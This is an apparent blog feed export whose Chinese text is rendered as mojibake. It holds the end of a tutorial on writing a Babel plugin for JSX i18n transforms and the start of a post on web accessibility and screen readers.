æ’°å¯« Babel Plugin çš„èµ·æ‰‹å¼å…ˆåˆ° AST Exporler é–‹å•Ÿä¸€å€‹æ–°çš„é é¢ï¼Œæ¥è‘—åœ¨ä¸Šæ–¹åˆ—è¡¨é¸å–å¥½ Parser (Babylon7) èˆ‡ Transformer (Babel7)ï¼Œä¸¦åœ¨æ—é‚Šçš„ç¨‹å¼å€å¡Šå…§å¯«ä¸Šä¸€é»ç¯„ä¾‹ç¨‹å¼ï¼Œå°±æ˜¯ä½ é æœŸèƒ½è¢« Babel èªå¾—ä¸¦è½‰æ›çš„â€æ–°â€ç¨‹å¼ç¢¼ï¼Œä»¥æˆ‘çš„ä¾‹å­å°±æ˜¯ï¼š
&lt;div&gt;  &#123;&#x27;#words-need-i18n&#x27;&#125;&lt;/div&gt;


æ¥è‘—çœ‹çœ‹ä½ çš„ AST é•·ä»€éº¼æ¨£å­ï¼Œæƒ³æƒ³ä½ è©²æ€éº¼ä¿®æ”¹ä»–ï¼š

å‡ºç¾æ²’çœ‹éçš„ type äº†ï¼æ²’é—œä¿‚ï¼Œåœ¨å‰›é–‹å§‹æ’°å¯« Plugin çš„éç¨‹ä¸­ä¸€å®šæœƒé‡åˆ°è¨±å¤šæ²’çœ‹éçš„ type æˆ–æ˜¯ä¸æ¸…æ¥šä»–çš„å±¬æ€§å‹åˆ¥ï¼Œå¥½åœ¨ babel æœ‰ä¸€ä»½éå¸¸è©³ç´°çš„ handbook èˆ‡ docs å¯ä»¥æŸ¥é–±ï¼Œåªè¦åˆ°ä¸Šé¢ ctrl + f ä¸€ä¸‹ï¼Œæ‡‰è©²éƒ½èƒ½åœ¨ä¸Šé ­æ‰¾åˆ°ä½ æ‰€éœ€è¦çš„çŸ¥è­˜ã€‚
æº–å‚™å¥½æ¸¬è©¦ç¨‹å¼ç¢¼ã€äº†è§£æ¸¬è©¦ç¨‹å¼ç¢¼çš„ ASTã€ä¹Ÿæœ‰äº†å·¥å…·æ›¸å¯ä»¥æŸ¥ï¼Œå°±èƒ½æ¯«ç„¡æ‡¸å¿µçš„é–‹å§‹æ’°å¯« Babel plugin äº†ã€‚
Babel plugin ä¹‹ Transformã€Visitorsã€Traversalé‚„è¨˜å¾—æˆ‘åœ¨æœ€ä¸€é–‹å§‹èªªéï¼ŒBabel å¤§é‡ä½¿ç”¨åˆ°äº† Visitor pattern å—ï¼Ÿå°±æ˜¯ç”¨åœ¨é€™é‚Šï¼
ä¹‹æ‰€ä»¥ Babel èƒ½å¤ è¼•æ˜“è§£æä½ çš„ç¨‹å¼ç¢¼ï¼Œä¸¦ä¸”é€²è¡Œå„ç¨®ä¿®æ”¹æ“ä½œï¼Œä¾è³´çš„å°±æ˜¯å„ç¨® visitors åœ¨ AST ä¸Šé€²è¡Œ traverseï¼Œç•¶é‡åˆ°å°æ‡‰çš„ node æ™‚ï¼Œvisitor å°±æœƒåšå‡ºç›¸å°çš„æ“ä½œï¼Œé€²è€Œå°‡è¼¸å…¥çš„ç¨‹å¼ç¢¼ transform æˆé æœŸçš„çµæœï¼Œé€™å°±æ˜¯æ•´å€‹ Babel plugin çš„å¯¦ä½œæ ¸å¿ƒã€‚
Babel plugin çš„åŸºç¤çµæ§‹è‹¥ä½ å‰›å‰›æœ‰ç…§è‘—æˆ‘çš„èªªæ˜ï¼Œåœ¨ AST Exporler ä¸Šæ–¹åˆ—è¡¨é¸å–å¥½ Parser èˆ‡ Transformerï¼Œé‚£å·¦ä¸‹è§’æ‡‰è©²æœƒå‡ºç¾é¡ä¼¼ä¸‹æ–¹çš„ç¨‹å¼å€å¡Šï¼š
export default function (babel) &#123;  const &#123; types: t &#125; = babel;  return &#123;    name: &quot;ast-transform&quot;, // not required    visitor: &#123;      Identifier(path, state) &#123;        path.node.name = path.node.name.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);      &#125;    &#125;  &#125;;&#125;

é€™æ˜¯ AST Exporler ä¸Šçš„é è¨­ templateï¼ŒåŸºæœ¬çš„ Babel plugin ä¹Ÿå°±æ˜¯é•·é€™æ¨£ã€‚
ä½ æœƒæ¥å—ä¸€å€‹ babel ç‰©ä»¶ï¼Œå…¶ä¸­æˆ‘å€‘æœƒéœ€è¦çš„æ˜¯ babel.typesï¼Œåœ¨ä¹‹å¾Œæ–°å¢ä¿®æ”¹ node æ™‚æœƒä¸æ–·åœ°ç”¨åˆ°ï¼Œå› æ­¤æœ€å¥½å­˜æˆä¸€å€‹è®Šæ•¸ï¼Œçœå» chain lookupã€‚
è€ŒåŸºæœ¬ä¸Šä½ è¦åšçš„å°±æ˜¯å›å‚³ä¸€å€‹ visitor objectï¼Œå…¶ä¸­å®šç¾©ä»¥ node type ç‚ºåçš„ funcitonï¼Œæ¥æ”¶å…©ç¨®åƒæ•¸ï¼špath èˆ‡ stateï¼š

pathpath ä»£è¡¨çš„æ˜¯åœ¨ traverse AST éç¨‹ä¸­ï¼Œé€£æ¥ node ä¹‹é–“çš„é‚Šã€‚æ‰€ä»¥ä½ å¯ä»¥ç”¨ path.node å–å¾—ç›®å‰çš„ç¯€é»ï¼Œä¹Ÿå¯ä»¥ç”¨ path.parent å–å¾—çˆ¶ç¯€é»ã€‚æ­¤å¤–ï¼Œpath é‚„èƒ½é€é path.traverse ä¾†åœ¨åŸæœ‰çš„ visitor å…§é€²è¡Œ nested visitingï¼Œé€™å°æ–¼æƒ³è¦è®“ visitor åœ¨æŸå€‹ç‰¹å®š visitor åŸ·è¡Œå¾Œå†åŸ·è¡Œæ™‚å¾ˆæœ‰å¹«åŠ©ï¼Œå¯ä»¥åƒè€ƒ handbook ç¯„ä¾‹ã€‚

statestate çš„ç”¨æ³•åœ¨ handbook ä¸Šä¹Ÿæ²’æœ‰èªªå¾—å¾ˆæ˜ç¢ºï¼Œæˆ‘çš„ç†è§£æ˜¯ä¸€å€‹è²«ä¸²æ•´å€‹ traverse éç¨‹çš„ global stateï¼Œä½ å¯ä»¥åœ¨ä»»æ„éšæ®µä¿®æ”¹ stateã€‚å…¶ä¸­ä¹ŸåŒ…å«ä½ æƒ³è®“ä½¿ç”¨ plugin çš„ä½¿ç”¨è€…å‚³å…¥çš„ options è¨­å®šã€‚


ä»¥ä¸Šè¿° template ç‚ºä¾‹ï¼Œä½ çš„ visitor åœ¨é‡åˆ° type ç‚º Identifier çš„ç¯€é»æ™‚ï¼Œå°±æœƒåŸ·è¡Œ path.node.name = path.node.name.split(&#39;&#39;).reverse().join(&#39;&#39;);ï¼Œä¹Ÿå°±æ˜¯å°‡è©² Identifier node çš„åç¨±çµ¦é¡›å€’éä¾†ã€‚
æ­¤å¤–ï¼ŒVisitor åœ¨ traverse AST çš„éç¨‹ä¸­ï¼Œæœƒåœ¨ç¯€é»ä¸Šé€²é€²å‡ºå‡ºï¼Œæ‰€ä»¥å…¶å¯¦æˆ‘å€‘æ˜¯å¯ä»¥å®šç¾© enter èˆ‡ exit çš„å‡½å¼ä¾†é€²è¡Œæ“ä½œçš„ï¼š
const MyVisitor = &#123;  Identifier: &#123;    enter() &#123;      console.log(&quot;Entered!&quot;);    &#125;,    exit() &#123;      console.log(&quot;Exited!&quot;);    &#125;  &#125;&#125;;

handbook ä¸­æœ‰æ›´å¤šè©³ç´°ä»‹ç´¹
å‹•æ‰‹æ’°å¯«è‡ªå·±çš„ VisitorçŸ¥é“åŸºç¤æ¶æ§‹å¾Œï¼Œå°±å¯ä»¥é–‹å§‹æ’°å¯« Visitor äº†ï¼
ä½†ä½ å¯èƒ½æœƒæœ‰é»æ²’é ­ç·’è©²æ€éº¼é–‹å§‹ï¼Œå› ç‚ºä½ ä¸çŸ¥é“è¦å¾å“ªå€‹ node type çš„ visitor function é–‹å§‹å¯«ã€‚é€™å°±æ˜¯ AST Exporler çš„å¥½è™•äº†ï¼Œä½ åªè¦å°‡æ¸¸æ¨™åœæ”¾åœ¨ç·¨è­¯å‰çš„ç¨‹å¼ç¢¼çš„ä»»æ„ä½ç½®ä¸Šï¼Œå³é‚Šçš„ AST æ¨¹å°±æœƒè‡ªå‹• Focus åˆ°å°æ‡‰çš„ç¯€é»ä¸Šé ­ï¼ˆå‰ææ˜¯è¦è¨˜å¾—é¸å–ä¸Šæ–¹çš„ AutoFocusï¼Œé è¨­æœƒæ˜¯å•Ÿç”¨çš„ï¼‰ï¼š

ä»¥ç¯„ä¾‹ä¾†èªªï¼Œæˆ‘å€‘è¦è½‰æ›çš„æ˜¯ &#123;&#39;#words-need-i18n&#39;&#125;ï¼Œå°‡æ¸¸æ¨™æŒ‡ä¸Šå»å¾Œç™¼ç¾ä»–æ˜¯ä¸€å€‹ type ç‚º StringLiteral çš„ nodeï¼Œé€™å°±æ˜¯æˆ‘å€‘è¦æ’°å¯«çš„ visitor functionï¼
export default function (babel) &#123;  const &#123; types: t &#125; = babel;    return &#123;    name: &quot;i18n-transform&quot;, // not required    visitor: &#123;      StringLiteral(path) &#123;        // some logic in here      &#125;    &#125;  &#125;;&#125;

æ¥ä¸‹ä¾†æŠŠéœ€è¦çš„é‚è¼¯å¡«å¯«ä¸Šå»ï¼š
visitor: &#123;  StringLiteral(path) &#123;    if (path.parent.type !== &#x27;JSXExpressionContainer&#x27;) return    if (path.node.value.startsWith(&#x27;#&#x27;)) &#123;      path.parentPath.replaceWith(          t.JSXElement(              t.JSXOpeningElement(                  t.JSXIdentifier(&#x27;FormattedMessage&#x27;),                    [t.JSXAttribute(                      t.JSXIdentifier(&#x27;id&#x27;),                        t.StringLiteral(path.node.value.replace(&#x27;#&#x27;,&#x27;&#x27;))                    )],                    true                ),                null,                [],                true            )        )    &#125;  &#125;&#125;


åœ¨å‰é¢æœ‰ä»‹ç´¹åˆ°ï¼Œpath ä»£è¡¨é€£æ¥è‘—ç›®å‰è¢«æ‹œè¨ªåˆ°çš„ç¯€é»ï¼Œæ‰€ä»¥æˆ‘å€‘èƒ½ç”¨ path.node.value.startsWith(&#39;#&#39;) ä¾†æª¢æŸ¥ç›®å‰ç¯€é»çš„å€¼æ˜¯å¦ç‚ºæˆ‘å€‘æƒ³è¦çš„ï¼ˆé–‹é ­ç‚º hashtagï¼‰ã€‚ä½†ç”±æ–¼ StringLiteral æ„Ÿè¦ºå¾—å‡ºä¾†æ˜¯åˆ°è™•éƒ½æœƒå‡ºç¾çš„ node typeï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦è¨­ç«‹ä¸€äº›æ¢ä»¶ï¼šç•¶ path.parent.type !== &#39;JSXExpressionContainer&#39; æ™‚ï¼Œæˆ‘å€‘å°± bypass é€™æ¬¡çš„ visit æ“ä½œã€‚æ‰€è¬‚çš„ JSXExpressionContainer å°±æ˜¯åœ¨ jsx ä¸­çš„ &#123; &#125;ã€‚
ç•¶æ¢ä»¶éƒ½æˆç«‹æ™‚ï¼Œä¹Ÿå°±ä»£è¡¨æˆ‘å€‘çš„ visitor æˆåŠŸæ‰¾åˆ°æˆ‘å€‘æƒ³è½‰æ›çš„ç¨‹å¼ç¢¼ &#123;&#39;#words-need-i18n&#39;&#125;ã€‚é€™æ™‚è°æ˜å¦‚ä½ ï¼Œä¸€å®šæœƒæƒ³èªªé‚£å°±æŠŠ path.node æ›¿æ›æ‰å°±å¥½äº†å§ï¼
ä½†æ˜¯ï¼Œpath.node ç›®å‰æŒ‡åˆ°çš„æ˜¯ StringLiteralï¼Œä¹Ÿå°±æ˜¯ #words-need-i18nï¼Œå¤–é¢é‚„æœ‰ä¸€å±¤ JSXExpressionContainerï¼Œæˆ‘å€‘ä¸èƒ½ç›´æ¥ä½¿ç”¨ path.node.replaceWith ä¾†æ›¿æ›ç¨‹å¼ç¢¼ï¼Œæˆ‘å€‘è¦é€£åŒä¸Šä¸€å±¤éƒ½ä¸€èµ·æ›æ‰ï¼Œå› æ­¤é€™é‚Šéœ€è¦ä½¿ç”¨ path.parentPath.replaceWithã€‚ä»¥åœ–åƒè¡¨ç¤ºçš„è©±å¤§æ¦‚åƒé€™æ¨£ï¼š


æ¥è‘—ï¼ŒreplaceWith æ¥æ”¶ä½ è¦æ›¿æ›çš„ç¯€é»ç•¶ä½œåƒæ•¸ï¼Œè€Œé€™æ™‚æˆ‘å€‘æœ€ä¸€é–‹å§‹å®£å‘Šçš„ const &#123; types: t &#125; = babel; å°±æ´¾ä¸Šç”¨å ´å•¦ï¼
babel.types å¯ä»¥å¹«æˆ‘å€‘å‰µå»ºå‡ºå„ç¨® type çš„ nodeï¼Œä¹Ÿæä¾›è¨±å¤š type checking çš„ functionï¼Œåƒæ˜¯å‰›å‰›æˆ‘å€‘æª¢æŸ¥ path.parent.type çš„åœ°æ–¹å…¶å¯¦æ‡‰è©²æ›´æ”¹ç‚º !t.isJSXExpressionContainer(path.parent)ã€‚æ›´å¤šé—œæ–¼ babel.types çš„æ“ä½œå¯ä»¥åƒè€ƒ handbook ä¸Šçš„èªªæ˜
ä½†åˆ°é€™é‚Šå•é¡Œåˆä¾†äº†ï¼Œæˆ‘å€‘æ€éº¼çŸ¥é“è¦å‰µå»ºä»€éº¼ node å‘¢ï¼Ÿ
æˆ‘ä¸€é–‹å§‹ä¹Ÿä¸çŸ¥é“ï¼Œä½†æŠ¬é ­æƒ³ä¸€æƒ³ï¼ŒAST Explorer ä¸æ˜¯å°±æœƒå¹«æˆ‘å€‘è½‰æ› AST å—ï¼Ÿé‚£å°±æŠŠæˆ‘å€‘é æœŸçš„çµæœç¨‹å¼ç¢¼ä¹Ÿè²¼ä¸Šå»ï¼Œä¸å°±çŸ¥é“ä»–çš„ AST é•·ç›¸äº†å—ï¼Ÿ
å¤§è†½å°‡ &lt;FormattedMessage id=&#123;&#39;#words-need-i18n&#39;&#125;&gt; è²¼ä¸Šå»å¾Œï¼Œå°±èƒ½å¾—åˆ°å…¶ AST çµæ§‹ï¼š

æ¥è‘—å‘¢ï¼Œå°±åˆ° babel å®˜ç¶²çš„ docs  è£¡é¢å»æŸ¥è©¢æ¯ä¸€ç¨®éœ€è¦å‰µå»ºçš„ typeï¼Œå„è‡ªè¦å¡«å…¥å“ªäº›åƒæ•¸ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œ&lt;FormattedMessage&gt; æœƒæ˜¯ä¸€å€‹è¢« JSXOpeningElement åŒ…èµ·ä¾†ï¼Œå¾ docs èƒ½çœ‹åˆ°éå¸¸è©³ç´°çš„èªªæ˜ï¼š

æˆ‘å€‘è¦å¡«å…¥ä¸‰å€‹åƒæ•¸: name, attributes èˆ‡ selfClosingï¼Œç¬¬ä¸€èˆ‡ç¬¬ä¸‰å€‹å¾ˆå¥½ç†è§£ï¼Œä¸­é–“çš„ attributes è£¡é¢åŒ…å«äº†å…¶ä»–çš„ typeï¼Œé€™æ™‚ä½ å°±éœ€è¦å†ç¹¼çºŒå¾€ä¸‹æŸ¥ï¼Œç›´åˆ°å®Œæˆæ‰€æœ‰éœ€æ±‚ç‚ºæ­¢ã€‚
ç…§è‘—é€™æ¨£çš„æ€è·¯ï¼Œä¸€ä¸€å°‡ AST å…§çš„çµæ§‹è½‰æ›åˆ°ä½ çš„ plugin ç¨‹å¼ç¢¼å…§ï¼Œå°±å¤§åŠŸå‘Šæˆå•¦ï¼

çµè«–ç•¶ç„¶é€™åªæ˜¯å€‹å¾ˆç°¡é™‹çš„å¯¦ä½œï¼Œä¸éä¹Ÿç®—æ˜¯æŠŠ plugin çš„è£½ä½œæ¦‚å¿µå‘ˆç¾äº†ä¸€éï¼Œä¸¦ç¨åŠ äº†è§£äº† AST çš„é‡è¦æ€§èˆ‡å¯¦ç”¨æ€§ã€‚
åœ¨å¯¦ä½œä½ æ‰€æƒ³è¦çš„ plugin åŠŸèƒ½æ™‚ï¼Œå‹¢å¿…æœƒé‡åˆ°è¤‡é›œå¾—å¤šçš„ç‹€æ³ï¼Œå»ºè­°å¤§å®¶é‚„æ˜¯ç›´æ¥åœ¨ handbook ä¸ŠæŸ¥çœ‹æœ€ç›´æ¥ï¼Œä¸Šé¢æœ‰æ›´è©³ç´°çš„ API ä»‹ç´¹èˆ‡æ•™å­¸ï¼ŒåŒ…å« babel-template ã€ babel-types çš„ builder èˆ‡ Validatorsï¼Œæ›´æœ‰ Best Practices å¯ä¾›åƒè€ƒã€‚ä¹Ÿå¯ä»¥çœ‹çœ‹é«˜æ‰‹å€‘çš„ä½œå“
æœ€å¾Œï¼Œä¸çŸ¥é“æœ‰æ²’æœ‰è®€è€…æœƒè¦ºå¾—æ•´å€‹ Plugin çš„é‚è¼¯æ“ä½œèˆ‡å¤§å®¶ç†Ÿæ‚‰çš„ jQuery æœ‰é»é¡ä¼¼ï¼Ÿéƒ½æ˜¯é¸å–åˆ°æŸå€‹å…ƒä»¶å¾Œï¼Œå°±é‡å°è©²å…ƒä»¶é€²è¡Œæ›´å‹•ï¼š$(&#39;StringLiteral&#39;).textContent = &#39;&lt;FormattedMessage id=&#123;&#39;xxx&#39;&#125;&gt;&#39;
æˆ‘åœ¨æŸ¥è³‡æ–™çš„éç¨‹ä¸­ç™¼ç¾ä¸€ç¯‡éå¸¸æœ‰è¶£åˆå¾ˆæ¸…æ¥šçš„ä»‹ç´¹ï¼Œå…¶ä¸­å°±æ˜¯ä»¥ jQuery ä¾†åšé¡æ¯”ï¼ˆç¯€éŒ„å…¶ slides ä¸­çš„ä¸€æ®µï¼‰ï¼š
Babel:Javascript :: jQuery:DOM
jQuery å¹«åŠ©ä½ æ”¹è®Š DOMï¼Œè€Œ Babel å¹«åŠ©ä½ è½‰åŒ– Javascirpt
å¯¦åœ¨æ˜¯å¾ˆè²¼åˆ‡çš„æ¯”å–»ä¸æ˜¯å—ï¼Ÿ
è³‡æ–™ä¾†æº
Writing custom Babel and ESLint plugins
How writing babel-plugin is like wrigint jQuery
Babel Plugin Handbook
AST Exporler
JAVASCRIPT AST VISUALIZER
AST specification

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>es6</tag>
        <tag>javascript</tag>
        <tag>pattern</tag>
        <tag>babel</tag>
        <tag>ast</tag>
      </tags>
  </entry>
  <entry>
    <title>Web Accessibility çš„é‡è¦æ€§</title>
    <url>/2019/10/13/web-accessibility-intro/</url>
    <content><![CDATA[å‰è¨€ä½ æ˜¯å¦æ›¾å› ç‚ºç¶²è·¯ä¸Šè¢«æ­§è¦–ã€è¢«éœ¸å‡Œçš„æ–°èæˆ–å½±ç‰‡è€Œæ†¤æ†¤ä¸å¹³ï¼Ÿä½ æ˜¯å¦æ›¾å› ç‚ºå„ç¨®èº«æ®˜å¿ƒä¸æ®˜çš„å‹µå¿—æ•…äº‹è€Œæ„Ÿåˆ°æ¿€å‹µï¼Ÿå¦‚æœä½ æœ‰éä¸Šè¿°ç¶“é©—ï¼Œé‚£ç•¶ä½ åœ¨è£½ä½œç¶²ç«™æ™‚ï¼Œæ˜¯å¦æ›¾ç¶“è€ƒé‡é Web Accessibilityï¼ˆa11yï¼‰ å‘¢ï¼Ÿ
è€å¯¦èªªï¼Œæˆ‘çœŸçš„å¾ˆå°‘åœ¨å¯¦ä½œæ™‚èªçœŸçš„é©—è­‰è‡ªå·±çš„ç¶²ç«™çš„å¯è¨ªæ€§ï¼ŒèŠ±åœ¨è€ƒé‡æ˜¯å¦èƒ½æ”¯æ´ IE 9 çš„æ™‚é–“é‚„æ¯”è¼ƒå¤šä¸€äº›ã€‚ï¼ˆæƒ³ç•¶å¹´åœ¨æ”¿åºœæ©Ÿé—œæœå‹™æ™‚ï¼Œçœ‹åˆ°å±€è™•é•·å¾ˆè‡ªè±ªå®˜ç¶²æ‹¿åˆ°ç„¡éšœç¤™ç¶²ç«™è©•ç­‰ç¬¬ä¸€æ™‚ï¼Œé‚„è¦ºå¾—è«åå…¶å¦™ï¼Œæƒ³èªªç¶²ç«™é€™éº¼é†œï¼Œåˆ°åº•å“ªè£¡ç„¡éšœç¤™ XDï¼‰
åœ¨å¯¦ä½œçš„æ™‚å€™ï¼ŒPM æœƒæ‹¿æ•¸æ“šå‘Šè¨´ä½ ï¼Œæœ‰å¤šå°‘ç”¨æˆ¶æ˜¯ä½¿ç”¨èˆŠç‰ˆçš„ç€è¦½å™¨ï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦æ”¯æ´åˆ°ä½•ç¨®ç¨‹åº¦ï¼Œä½†æ‡‰è©²å¾ˆå°‘ PM æœƒæ‹¿å‡ºæ•¸æ“šå‘Šè¨´ä½ ï¼Œæœ‰å¤šå°‘ screen reader ä¾†å­˜å–æˆ‘å€‘çš„ç¶²ç«™Â·ã€‚
ç„¶è€Œï¼Œå…‰å°ç£ï¼Œ2018 å¹´çš„èº«å¿ƒéšœç¤™äººå£æœ‰ä¸€ç™¾å¤šè¬äººï¼Œå…¶ä¸­è¦–è¦ºéšœç¤™çš„æœ‰å°‡è¿‘å…­è¬ï¼ˆè¡›ç”Ÿç¦åˆ©è™•çš„è³‡æ–™ï¼‰ï¼Œç¾åœ‹æ¯”ä¾‹æ›´é«˜ï¼Œæœ‰å°‡è¿‘ 25% çš„èº«å¿ƒéšœç¤™äººå£ï¼ˆè³‡æ–™ä¾†æºï¼‰ã€‚
ä¾ç…§ä½ ç”¢å“çš„ç”¨æˆ¶æ¯”ä¾‹ï¼Œé€™äº›æ•¸æ“šå¤§æ¦‚ç„¡æ³•èªªæœä½ çš„ PMï¼Œè®“ä»–å€‘çµ¦ä½ æ›´å¤šæ™‚é–“æ€è€ƒå¦‚ä½•å¢å¼·ç¶²ç«™çš„å¯è¨ªæ€§ï¼Œä½†ä»”ç´°æƒ³æƒ³ï¼Œå¦‚æœä½ åœ¨ä¹é‚£äº›èº«å¿ƒå¥å…¨å»ä¸é¡˜æ„å‡ç´šè‡ªå·±ç€è¦½å™¨çš„äººï¼Œè€Œä¸åœ¨ä¹é€™äº›èµ°å‡ºéšœç¤™ï¼Œé€£æ¥åˆ°ç¶²è·¯å¸å–çŸ¥è­˜çš„æ®˜éšœäººå£«ï¼Œä½ æ˜¯ä¸æ˜¯ç„¡æ„ä¸­åœ¨ä»–å€‘çš„äººç”Ÿé“è·¯ä¸­å¢åŠ äº†æ›´å¤šé˜»ç¤™ï¼Œä¸è‡ªè¦ºåœ°æˆç‚ºæ­§è¦–ä»–äººçš„ä¸€æ–¹å‘¢ã€‚
ä»Šå¤©æƒ³é€éé€™ç¯‡æ–‡ç« ï¼Œæ•´ç†ä¸€äº›è³‡æºèˆ‡ç°¡çŸ­çš„å¯¦ä½œè¦é»ï¼Œå–šé†’å¤§å®¶å° Web Accessibility é‡è¦æ€§çš„èªçŸ¥ï¼Œä¹Ÿæ˜¯æé†’è‡ªå·±åœ¨æœªä¾†å¯¦ä½œä¸Šå¿…å®šè¦å¤šåŠ æ³¨æ„ã€‚
ä½¿ç”¨ screen reader çš„æ„Ÿè¦ºæ˜¯ä»€éº¼ç›¸ä¿¡æœƒçœ‹åˆ°é€™ç¯‡æ–‡ç« çš„äººï¼Œå¤šå°‘å°æ–¼ Web Accessiblity éƒ½æœ‰äº†è§£ï¼ŒçŸ¥é“æ˜¯ç‚ºäº†è¼”åŠ©éšœç¤™äººå£«é–±è®€ç¶²é å…§å®¹ï¼Œå¹³å¸¸å¯¦ä½œæ™‚è‡³å°‘åœ¨ &lt;img&gt; å…ƒç´ ä¸ŠæœƒåŠ ä¸Š alt ç­‰æ–‡å­—ä¾†æè¿°åœ–ç‰‡ã€‚ä½†ä½ æœ‰çœŸçš„ä½¿ç”¨é screen reader å—ï¼Ÿä½ çŸ¥é“ä½¿ç”¨é€™äº›è¼”åŠ©å·¥å…·ä¸Šç¶²çš„äººï¼Œçœ‹åˆ°çš„ä¸–ç•Œè·Ÿä½ æœ‰å¤šå¤§çš„ä¸åŒå—ï¼Ÿ
æˆ‘åŸæœ¬ä¹Ÿä¸çŸ¥é“ï¼Œç›´åˆ°æˆ‘è©¦ç”¨äº† Mac å…§å»ºçš„ VoiceOverï¼Œç”¨å®ƒä¾†é–±è®€å¹³å¸¸çœ‹çš„ç¶²ç«™ï¼Œåƒæ˜¯ wikipediaï¼š


é«”é©—å¯¦åœ¨å¾ˆç³Ÿï¼Œé™¤äº†æ©Ÿå™¨äººçš„è²èª¿å¤–ï¼Œå¤–åŠ æ¥µå¿«çš„èªé€Ÿï¼Œåœ¨ä½ å¾ç€è¦½å™¨çš„åˆ†é æ¨™ç±¤ç§»å‹•åˆ°çœŸæ­£çš„ç¶²é å…§å®¹å‰ï¼Œé‚„éœ€ç¶“éè¨±å¤šç€è¦½å™¨æœ¬èº«æŒ‰éˆ•é¸é …çš„ä»‹ç´¹ï¼Œæ¥è‘—åˆ°äº†ç¶²é å…§å®¹ï¼Œæ–‡ç« å› ç‚ºé€£çµçš„é—œä¿‚ï¼Œè®Šå¾—ç ´ç¢ï¼ˆç‚ºäº†è®“ä½ çŸ¥é“æ˜¯é€£çµæˆ–æ˜¯æŒ‰éˆ•ï¼Œåœ¨æ–‡å­—å…§å®¹å‰éƒ½æœƒå…ˆæœ—è®€å‡ºè©²æ®µå…§å®¹çš„åŠŸèƒ½æ€§ï¼Œåƒæ˜¯ï¼šé€£çµã€æŒ‰éˆ•ï¼‰ï¼Œé–±è®€é †åºä¹Ÿèˆ‡æˆ‘å€‘æ†‘çœ¼ç›è§€çœ‹æ™‚çš„ä¸åŒã€‚
ç„¶è€Œ Wikipedia å·²ç¶“ç®—æ˜¯ a11y è™•ç†å¾—ä¸éŒ¯çš„äº†ï¼Œç•¢ç«Ÿå…§å®¹å¤§å¤šä¹Ÿåªæœ‰æ–‡å­—èˆ‡åœ–ç‰‡ã€‚æƒ³æƒ³çœ‹ç¾åœ¨é€™éº¼å¤šç‚«éº—ä»‹é¢çš„ç¶²ç«™ï¼Œå„ç¨®éœ€è¦ä½¿ç”¨è€…èˆ‡ä¹‹äº’å‹•çš„åŠŸèƒ½ï¼Œå…‰ç”¨æƒ³åƒçš„å°±æ˜¯æ‚²åŠ‡ï¼Œçœ‹ä¸€ä¸‹ Google å¤§è‚†å®£å‚³çš„ AMP Storyï¼š


åœ¨å¼·èª¿ Web performance çš„åŒæ™‚ï¼Œweb accessibility ä¹Ÿè©²è€ƒé‡é€²å»ã€‚é€™é‚Šå°±æœ‰æ–‡ç« åœ¨è¨è«–é—œæ–¼ amp-story åœ¨ a11y çš„ issueï¼Œä¸é ampproject å…§æ˜¯æœ‰ accessibility working group åœ¨æƒ³è¾¦æ³•è§£å±€çš„ã€‚
ä¸Šé¢çš„ Screen reader ç¯„ä¾‹æ¯”è¼ƒæ˜¯é‡å°è¦–éšœæœ‹å‹çš„ä½¿ç”¨ç‚ºä¸»ï¼Œç¾å¯¦ä¸­èƒ½é€ æˆç”Ÿæ´»ä¸ä¾¿çš„å¯ä¸åªæœ‰è¦–è¦ºä¸Šçš„å›°é›£ï¼Œé‚„æœ‰è½è¦ºã€è‚¢é«”ç­‰ç­‰ï¼Œåƒæ˜¯æ»‘é¼ é€™é¡éœ€è¦é«˜åº¦æ‰‹çœ¼å”èª¿èƒ½åŠ›çš„æ“ä½œï¼Œå°±ä¸æ˜¯é‚£éº¼æœ‰è¦ªå’ŒåŠ›ï¼Œå› æ­¤å…‰æ˜¯é€ééµç›¤æ“ä½œç¶²ç«™çš„é †æš¢åº¦ï¼Œå°±å¿…é ˆå¥½å¥½æ€è€ƒï¼Œä¹Ÿæ˜¯å¯¦ä½œ Web Accessibility æ™‚çš„ä¸€å¤§é‡é»ã€‚
å¦‚æœæƒ³å¿«é€Ÿé«”é©—ä¸€ä¸‹ä½¿ç”¨ screen reader çš„æ•ˆæœï¼Œåˆä¸æƒ³å­¸ç¿’ Voiceover ç­‰ç³»çµ±å…§å»º reader çš„ï¼Œå¯ä»¥åˆ° udacity æä¾›çš„ç¶²ç«™ è©¦è©¦ï¼Œä½¿ç”¨çš„æ˜¯ Chrome çš„ chromevox-lite é–±è®€å™¨ï¼Œä¸”æœ‰åˆ»æ„å°‡å…§å®¹æ¨¡ç³ŠåŒ–ï¼Œæ„Ÿå—æœƒæ›´çœŸå¯¦é»ã€‚
Web Accessibility çš„è³‡æºèˆ‡å¯¦ä½œè¦é»èªªäº†è¨±å¤šç·£ç”±ä»¥åŠç¯„ä¾‹ï¼Œç¾åœ¨ä¾†è«‡è«‡è©²å¦‚ä½•å­¸ç¿’ Web Accessibilityï¼Œä¸¦å¯¦ä½œåœ¨æˆ‘å€‘çš„ç¶²ç«™ä¸­ã€‚
ç¶²çµ¡å…§å®¹ç„¡éšœç¤™åŠŸèƒ½æŒ‡å— - Web Content Accessibility Guidelineså…ˆå¾ W3C æŒ‡å—äº†è§£ â€œç„¡éšœç¤™â€ çš„å®šç¾©ã€‚ç¶²çµ¡å…§å®¹ç„¡éšœç¤™åŠŸèƒ½æŒ‡å— (WCAG) 2.1ï¼Œæ˜¯ W3C æ“¬å®šçš„ç„¡éšœç¤™åŠŸèƒ½æŒ‡å—å’Œæœ€ä½³åšæ³•ï¼Œæ—¨åœ¨æœ‰ç³»çµ±åœ°é—¡è¿°â€œç„¡éšœç¤™åŠŸèƒ½â€çš„å«ç¾©ã€‚å¾ˆå¤šåœ‹å®¶æ”¿åºœæ©Ÿé—œéƒ½æœƒè¦æ±‚æ ¹æ“šæ­¤æŒ‡å—ä¾†å¯¦ä½œç¶²ç«™ã€‚
WCAG æœ‰å››å¤§åŸå‰‡ï¼š

